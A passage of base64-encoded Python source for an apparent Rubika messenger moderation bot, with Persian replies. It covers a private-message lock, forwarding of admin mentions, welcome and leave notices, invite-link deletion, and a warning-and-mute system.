BvcGVuKCJNb2RlL0xvY2siKS5yZWFkKCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgbW9kZSA9ICJvZmYiCiAgICAgICAgICAgICAgICBpZiBtb2RlID09ICJvbiI6CiAgICAgICAgICAgICAgICAgICAgaWYgZXZlbnQudHlwZSA9PSAiVXNlciIgYW5kIG5vdCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICAgICAgc2FsbSA9IGRvbnRsb2NrLmNvdW50KGV2ZW50Lm9iamVjdF9ndWlkKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBzYWxtID09IDE6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NrLmFwcGVuZChldmVudC5vYmplY3RfZ3VpZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMudXNlcnMuR2V0VXNlckluZm8oZXZlbnQub2JqZWN0X2d1aWQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdCA9IGxvY2suY291bnQoZXZlbnQub2JqZWN0X2d1aWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0ID09IDE6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoZiLigKIg8J2YvvCdmZ7wnZml8J2ZnfCdmZrwnZmn8J2Zky3wnZi98J2ZivCdmY8g4oCiXG7Yp9iu2LfYp9ixICgxLzUpIOKdjFxuXG7aqdin2LHYqNixIEB7dXMudXNlci51c2VybmFtZX1cbtin2LIg2KfYsdiz2KfZhCDZvtuM2KfZhSDYrtmI2K/Yr9in2LHbjCDaqdmG24zYry4g2K/YsSDYutuM2LEg2KfbjNmGINi12YjYsdiqINi02YXYpyDYqNmE2KfaqSDYrtmI2KfZh9uM2K8g2LTYry4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdCA9PSAyOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYi4oCiIPCdmL7wnZme8J2ZpfCdmZ3wnZma8J2Zp/CdmZMt8J2YvfCdmYrwnZmPIOKAolxu2KfYrti32KfYsSAoMi81KSDinYxcblxu2qnYp9ix2KjYsSBAe3VzLnVzZXIudXNlcm5hbWV9XG7Yp9iyINin2LHYs9in2YQg2b7bjNin2YUg2K7ZiNiv2K/Yp9ix24wg2qnZhtuM2K8uINiv2LEg2LrbjNixINin24zZhiDYtdmI2LHYqiDYtNmF2Kcg2KjZhNin2qkg2K7ZiNin2YfbjNivINi02K8uIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHQgPT0gMzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShmIuKAoiDwnZi+8J2ZnvCdmaXwnZmd8J2ZmvCdmafwnZmTLfCdmL3wnZmK8J2ZjyDigKJcbtin2K7Yt9in2LEgKDMvNSkg4p2MXG5cbtqp2KfYsdio2LEgQHt1cy51c2VyLnVzZXJuYW1lfVxu2KfYsiDYp9ix2LPYp9mEINm+24zYp9mFINiu2YjYr9iv2KfYsduMINqp2YbbjNivLiDYr9ixINi624zYsSDYp9uM2YYg2LXZiNix2Kog2LTZhdinINio2YTYp9qpINiu2YjYp9mH24zYryDYtNivLiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0ID09IDQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoZiLigKIg8J2YvvCdmZ7wnZml8J2ZnfCdmZrwnZmn8J2Zky3wnZi98J2ZivCdmY8g4oCiXG7Yp9iu2LfYp9ixICg0LzUpIOKdjFxuXG7aqdin2LHYqNixIEB7dXMudXNlci51c2VybmFtZX1cbtin2LIg2KfYsdiz2KfZhCDZvtuM2KfZhSDYrtmI2K/Yr9in2LHbjCDaqdmG24zYry4g2K/YsSDYutuM2LEg2KfbjNmGINi12YjYsdiqINi02YXYpyDYqNmE2KfaqSDYrtmI2KfZh9uM2K8g2LTYry4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdCA9PSA1OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYi2qnYp9ix2KjYsSBAe3VzLnVzZXIudXNlcm5hbWV9XG7YqNmHINiv2YTbjNmEINin2LHYs9in2YQg2b7bjNin2YUg2YXaqdix2LEg2KjZhNin2qkg2LTYry4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGNsaWVudChtZXRob2RzLnVzZXJzLlNldEJsb2NrVXNlcihldmVudC5vYmplY3RfZ3VpZCkpCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5sb2NrIikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSB0ZXh0LnJlcGxhY2UoIi5sb2NrIiwiIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgIGlmIGNvbW1hbmQgPT0gIm9uIiBvciAib2ZmIjoKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbigiTW9kZS9Mb2NrIiwidyIpLndyaXRlKGNvbW1hbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiIqKkxPQ0sqKiDwnZmI8J2ZpPCdmZnwnZmaIHtjb21tYW5kfSIpCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIlVubG9jayIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGRvbnRsb2NrLmFwcGVuZChvYmplY3RzKQogICAgICAgICAgICAgICAgICAgICAgICB1cyA9IGF3YWl0IGNsaWVudChtZXRob2RzLnVzZXJzLkdldFVzZXJJbmZvKG9iamVjdHMpKQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KGYi2qnYp9ix2KjYsSBbIEB7dXMudXNlci51c2VybmFtZX0gXVxu2YXbjNiq2YjYp9mG24zYryDZvtuM2KfZhSDYp9ix2LPYp9mEINqp2YbbjNivIC4iKSAKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgiTG9jayIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGRvbnRsb2NrLnJlbW92ZShvYmplY3RzKQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5kZWxldGVfbWVzc2FnZXMoKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKGYiQHthZG1pbi51c2VyLnVzZXJuYW1lfSIpIGFuZCBldmVudC50eXBlID09ICJHcm91cCI6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShmIltCYWwgP10oe2d1aWR9KSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGNsaWVudChtZXRob2RzLm1lc3NhZ2VzLkZvcndhcmRNZXNzYWdlcyhvYmplY3RzLCBhZG1pbi51c2VyLnVzZXJfZ3VpZCwgbWVzc2FnZV9pZHM9ZXZlbnQubWVzc2FnZV9pZCkpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgIyAgICAgICAgICAgWyBHcm91cCBdICAgICAgICMKCgogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKCIuc2V0IikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbigiTW9kZS9TZXQiLCJ3Iikud3JpdGUoZXZlbnQub2JqZWN0X2d1aWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoIvCdmYLwnZmn8J2ZpPCdmarwnZmlIPCdmY7wnZma8J2ZjyDwnZmP8J2ZpPCdmaTwnZmh8J2ZqCDinJTvuI8iKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgiLmdyb3VwIikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHRleHQucmVwbGFjZSgiLmdyb3VwIiwiIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCJNb2RlL0dyb3VwIiwidyIpLndyaXRlKGNvbW1hbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiLwnZmC8J2Zp/CdmaTwnZmq8J2ZpSDwnZmI8J2ZpPCdmL/wnZmaIHtjb21tYW5kfSIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygiTW9kZS9Hcm91cCIpOgogICAgICAgICAgICAgICAgICAgIG1vZGUgPSBvcGVuKCJNb2RlL0dyb3VwIikucmVhZCgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIG1vZGUgPSAib2ZmIgogICAgICAgICAgICAgICAgaWYgbW9kZSA9PSAib24iOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgY2hhdF9pZCA9IG9wZW4oIk1vZGUvU2V0IikucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9iamVjdHMgPT0gY2hhdF9pZDoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBldmVudC5maW5kX2tleXMoa2V5cz1bJ2V2ZW50X2RhdGEnXSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBldmVudC5tZXNzYWdlLmV2ZW50X2RhdGEudHlwZSA9PSAiUmVtb3ZlR3JvdXBNZW1iZXJzIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMudXNlcnMuR2V0VXNlckluZm8oZXZlbnQucGVlcl9vYmplY3RzWzBdLm9iamVjdF9ndWlkKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYiIiIK2qnYp9ix2KjYsSBbIHt1cy51c2VyLmZpcnN0X25hbWV9XSh7dXMudXNlci51c2VyX2d1aWR9KQrYp9iyINqv2LHZiNmHINio2YYg2LTYryAuCiAgICAiIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGV2ZW50Lm1lc3NhZ2UuZXZlbnRfZGF0YS50eXBlID09ICJBZGRlZEdyb3VwTWVtYmVycyI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cyA9IGF3YWl0IGNsaWVudChtZXRob2RzLnVzZXJzLkdldFVzZXJJbmZvKGV2ZW50LnBlZXJfb2JqZWN0c1swXS5vYmplY3RfZ3VpZCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBncm91cHMgPSBhd2FpdCBjbGllbnQobWV0aG9kcy5ncm91cHMuR2V0R3JvdXBJbmZvKGV2ZW50Lm9iamVjdF9ndWlkKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNwcmludChncm91cC5qc29uaWZ5KGluZGVudD0yKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYiIiIK2qnYp9ix2KjYsSBbIHt1cy51c2VyLmZpcnN0X25hbWV9XSh7dXMudXNlci51c2VyX2d1aWR9KQrYqNmHINqv2LHZiNmHINmF2Kcg2K7ZiNi0INin2YjZhdiv24wgLgogICAgIiIiKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGV2ZW50Lm1lc3NhZ2UuZXZlbnRfZGF0YS50eXBlID09ICJMZWF2ZUdyb3VwIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMudXNlcnMuR2V0VXNlckluZm8oZXZlbnQucGVlcl9vYmplY3RzWzBdLm9iamVjdF9ndWlkKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYiIiIK2K/Yp9i0IFt7dXMudXNlci5maXJzdF9uYW1lfV0oe3VzLnVzZXIudXNlcl9ndWlkfSkK2Kgg2qnbjNix2YUg2qkg2YTZgSDYr9in2K/bjCA6LwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiIiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBldmVudC5tZXNzYWdlLmV2ZW50X2RhdGEudHlwZSA9PSAiSm9pbmVkR3JvdXBCeUxpbmsiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXMgPSBhd2FpdCBjbGllbnQobWV0aG9kcy51c2Vycy5HZXRVc2VySW5mbyhldmVudC5wZWVyX29iamVjdHNbMF0ub2JqZWN0X2d1aWQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoZiIiIgraqdin2LHYqNixIFt7dXMudXNlci5maXJzdF9uYW1lfV0oe3VzLnVzZXIudXNlcl9ndWlkfSkK2KjZhyDar9ix2YjZhyDZhdinINiu2YjYtCDYp9mI2YXYr9uMIC4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiIiKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGcgPSByZS5maW5kYWxsKHIiaHR0cHM6Ly9ydWJpa2EuaXIvam9pbmcvXHd7MzJ9Iix0ZXh0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGdyIGluIGc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZGVsZXRlX21lc3NhZ2VzKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGMgPSByZS5maW5kYWxsKHIiaHR0cHM6Ly9ydWJpa2EuaXIvam9pbmMvXHd7MzJ9Iix0ZXh0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGNyIGluIGM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZGVsZXRlX21lc3NhZ2VzKCkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgi2KfYrti32KfYsSIpIGFuZCBldmVudC50eXBlID09ICJHcm91cCIgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGV4dC5yZXBsYWNlKCLYp9iu2LfYp9ixIiwiIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5kZWxldGVfbWVzc2FnZXMoKQogICAgICAgICAgICAgICAgICAgICAgICBpbmZvID0gYXdhaXQgY2xpZW50KG1ldGhvZHMubWVzc2FnZXMuR2V0TWVzc2FnZXNCeUlEKG9iamVjdHMsZXZlbnQubWVzc2FnZS5yZXBseV90b19tZXNzYWdlX2lkKSkKICAgICAgICAgICAgICAgICAgICAgICAgdXMgPSBhd2FpdCBjbGllbnQobWV0aG9kcy51c2Vycy5HZXRVc2VySW5mbyhpbmZvLmF1dGhvcl9vYmplY3RfZ3VpZCkpCiAgICAgICAgICAgICAgICAgICAgICAgIHdhbnRlZC5hcHBlbmQodXMudXNlci51c2VyX2d1aWQpCiAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsID0gd2FudGVkLmNvdW50KHVzLnVzZXIudXNlcl9ndWlkKQogICAgICAgICAgICAgICAgICAgICAgICBpZiB0b3RhbCA9PSAxOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGNsaWVudChtZXRob2RzLm1lc3NhZ2VzLlNlbmRNZXNzYWdlKG9iamVjdHMsbWVzc2FnZT1mIiIiCuKAuiDaqdin2LHYqNixIFsge3VzLnVzZXIuZmlyc3RfbmFtZX1dKHt1cy51c2VyLnVzZXJfZ3VpZH0pICAgICAKCuKAuuKAuiDYr9mE24zZhCA6IHtjb21tYW5kfQoKCuKAuuKAuuKAuiDYtNmF2KcgWyAxLzMgXSDYp9iu2LfYp9ixINiv2LHbjNin2YHYqiDaqdix2K/bjNivLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICIiIixyZXBseV90b19tZXNzYWdlX2lkPWV2ZW50Lm1lc3NhZ2UucmVwbHlfdG9fbWVzc2FnZV9pZCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgICAgICBpZiB0b3RhbCA9PSAyOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGNsaWVudChtZXRob2RzLm1lc3NhZ2VzLlNlbmRNZXNzYWdlKG9iamVjdHMsbWVzc2FnZT1mIiIiCuKAuiDaqdin2LHYqNixIFsge3VzLnVzZXIuZmlyc3RfbmFtZX1dKHt1cy51c2VyLnVzZXJfZ3VpZH0pCgrigLrigLog2K/ZhNuM2YQgOiB7Y29tbWFuZH0KCgrigLrigLrigLog2LTZhdinIFsgMi8zIF0g2KfYrti32KfYsSDYr9ix24zYp9mB2Kog2qnYsdiv24zYry4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAiIiIscmVwbHlfdG9fbWVzc2FnZV9pZD1ldmVudC5tZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2VfaWQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG90YWwgPT0gMzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBjbGllbnQobWV0aG9kcy5tZXNzYWdlcy5TZW5kTWVzc2FnZShvYmplY3RzLG1lc3NhZ2U9ZiIiIgrigLog2qnYp9ix2KjYsSBbIHt1cy51c2VyLmZpcnN0X25hbWV9XSh7dXMudXNlci51c2VyX2d1aWR9KSAgICAgICAKCuKAuuKAuiDYr9mE24zZhCA6IHtjb21tYW5kfQoKCuKAuuKAuuKAuiDYtNmF2KcgWyAzLzMgXSDYp9iu2LfYp9ixINiv2LHbjNin2YHYqiDaqdix2K/bjNivLiAKCuKAuuKAuuKAuuKAuiDYqNmHINiv2YTbjNmEINiv2LHbjNin2YHYqiBbIDMgXSDYp9iu2LfYp9ixINmF24zZiNiqINmF24zYtNmI24zYryAgICAgICAgICAgICAgICAgICAgICAgCiAgICAiIiIscmVwbHlfdG9fbWVzc2FnZV9pZD1ldmVudC5tZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2VfaWQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG11dGUuYXBwZW5kKHVzLnVzZXIudXNlcl9ndWlkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgi2K3YsNmBINin2K7Yt9in2LEiKSBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBpbmZvID0gYXdhaXQgY2xpZW50KG1ldGhvZHMubWVzc2FnZXMuR2V0TWVzc2FnZXNCeUlEKG9iamVjdHMsZXZlbnQubWVzc2FnZS5yZXBseV90b19tZXNzYWdlX2lkKSkKICAgICAgICAgICAgICAgICAgICAgICAgdXMgPSBhd2FpdCBjbGllbnQobWV0aG9kcy51c2Vycy5HZXRVc2VySW5mbyhpbmZvLmF1dGhvcl9vYmplY3RfZ3VpZCkpCiAgICAgICAgICAgICAgICAgICAgICAgIHdhbnRlZC5yZW1vdmUodXMudXNlci51c2VyX2d1aWQpCiAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsID0gd2FudGVkLmNvdW50KHVzLnVzZXIudXNlcl9ndWlkKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG90YWwgPT0gMDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBjbGllbnQobWV0aG9kcy5tZXNzYWdlcy5TZW5kTWVzc2FnZShvYmplY3RzLG1lc3NhZ2U9ZiIiIgrigLog2qnYp9ix2KjYsSBbIHt1cy51c2VyLmZpcnN0X25hbWV9XSh7dXMudXNlci51c2VyX2d1aWR9KQoK4oC64oC6INin2K7Yt9in2LEg2YfYp9uMINi02YXYpyBbIDAvMyBdICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgIiIiLHJlcGx5X3RvX21lc3NhZ2VfaWQ9ZXZlbnQubWVzc2FnZS5yZXBseV90b19tZXNzYWdlX2lkKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZiB0b3RhbCA9PSAxOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGNsaWVudChtZXRob2RzLm1lc3NhZ2VzLlNlbmRNZXNzYWdlKG9iamVjdHMsbWVzc2FnZT1mIiIiCuKAuiDaqdin2LHYqNixIFsge3VzLnVzZXIuZmlyc3RfbmFtZX1dKHt1cy51c2VyLnVzZXJfZ3VpZH0pCgrigLrigLog2KfYrti32KfYsSDZh9in24wg2LTZhdinIFsgMS8zIF0gICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAiIiIscmVwbHlfdG9fbWVzc2FnZV9pZD1ldmVudC5tZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2VfaWQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG90YWwgPT0gMjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBjbGllbnQobWV0aG9kcy5tZXNzYWdlcy5TZW5kTWVzc2FnZShvYmplY3RzLG1lc3NhZ2U9ZiIiIgrigLog2qnYp9ix2KjYsSBbIHt1cy51c2VyLmZpcnN0X25hbWV9XSh7dXMudXNlci51c2VyX2d1aWR9KQoK4oC64oC6INin2K7Yt9in2LEg2YfYp9uMINi02YXYpyBbIDIvMyBdICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgIiIiLHJlcGx5X3RvX21lc3NhZ2VfaWQ9ZXZlbnQubWVzc2FnZS5yZXBseV90b19tZXNzYWdlX2lkKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvdGFsID09IDM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgY2xpZW50KG1ldGhvZHMubWVzc2FnZXMuU2VuZE1lc3NhZ2Uob2JqZWN0cyxtZXNzYWdlPWYiIiIK4oC6INqp2KfYsdio2LEgWyB7dXMudXNlci5maXJzdF9uYW1lfV0oe3VzLnVzZXIudXNlcl9ndWlkfSkKCuKAuuKAuiDYp9iu2LfYp9ixINmH2KfbjCDYtNmF2KcgWyAzLzMgXQoK4oC64oC64oC6INio2Ycg2YfZhduM2YYg2K/ZhNuM2YQg2LTZhdinINin2K7Ysdin2Kwg2YXbjNi02YjbjNivIC4gIAogICAgIiIiLHJlcGx5X3RvX21lc3NhZ2VfaWQ9ZXZlbnQubWVzc2FnZS5yZXBseV90b19tZXNzYWdlX2lkKSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcyAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5tdXRlICIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGV4dC5yZXBsYWNlKCIubXV0ZSIsIiIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlkcyA9IGNvbW1hbmQucmVwbGFjZSgiQCIsIiIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgdXMgPSBhd2FpdCBjbGllbnQobWV0aG9kcy5leHRyYXMuR2V0T2JqZWN0QnlVc2VybmFtZShpZHMpKQogICAgICAgICAgICAgICAgICAgICAgICBtdXRlLmFwcGVuZCh1cy51c2VyLnVzZXJfZ3VpZCkKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoZiLwnZmI8J2ZqvCdmY/wnZmaIPCdmY7wnZma8J2Zj1xue2NvbW1hbmR9IikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIGd1aWQgaW4gbXV0ZToKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGV2ZW50LnR5cGUgPT0gIkdyb3VwIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMudXNlcnMuR2V0VXNlckluZm8oZXZlbnQubWVzc2FnZS5hdXRob3Jfb2JqZWN0X2d1aWQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZGVsZXRlX21lc3NhZ2VzKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3VzLnVzZXIuZmlyc3RfbmFtZX0gXDAzM1szMm1QQUsgXDAzM1szNW1TSE9EID0+IFwwMzNbMzFtIHt0ZXh0fSIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5kZWxtdXRlICIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGV4dC5yZXBsYWNlKCIuZGVsbXV0ZSAiLCIiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBpZHMgPSBjb21tYW5kLnJlcGxhY2UoIkAiLCIiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgIHVzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMuZXh0cmFzLkdldE9iamVjdEJ5VXNlcm5hbWUoaWRzKSkKICAgICAgICAgICAgICAgICAgICAgICAgbXV0ZS5yZW1vdmUodXMudXNlci51c2VyX2d1aWQpCiAgIC